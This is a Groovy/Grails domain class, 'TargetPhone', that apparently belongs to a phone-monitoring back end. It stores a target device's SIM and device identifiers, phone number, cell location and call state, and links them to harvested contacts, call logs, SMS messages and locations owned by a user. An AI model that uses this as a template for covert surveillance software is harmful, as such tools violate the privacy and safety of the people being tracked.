package com.xaviar.domain

import liquibase.statement.AutoIncrementConstraint;

import org.hibernate.type.descriptor.sql.SqlTypeDescriptor;

class TargetPhone  {

	String simSubscriberId;
	String networkOperatorName;
	String simSerialNumber;
	String phoneType;
	String deviceID;
	String deviceSoftwareVersion;
	String networkOperator;
	String callState;
	String networkCountryIso;
	String simOperator;
	String simstate;
	String simOperatorName;
	String simCountryIso;
	String line1Number;
	String cellLocation;	
		
	static hasMany = [contacts:Contact,callLogs:CallLog,smss:Sms,locations:Location]
	static hasOne =Token
	static belongsTo = [user:User]
	
	
    static constraints = {
		contacts nullable :true;
		callLogs nullable :true;
		smss nullable :true;
		locations nullable :true;		
		//user nullable: false;
		
		networkOperatorName nullable :true;
		simSerialNumber nullable :true;
		phoneType nullable :true;
		deviceID nullable :true;
		deviceSoftwareVersion nullable :true;
		networkOperator nullable :true;
		callState nullable :true;
		networkCountryIso nullable :true;
		simOperator nullable :true;
		simstate nullable :true;
		simOperatorName nullable :true;
		simCountryIso nullable :true;
		line1Number nullable :true;
		cellLocation nullable :true;
    }
	
	static mapping = {
		id name:'simSubscriberId', type:'string', generator: 'assigned'
		version false
	}
}
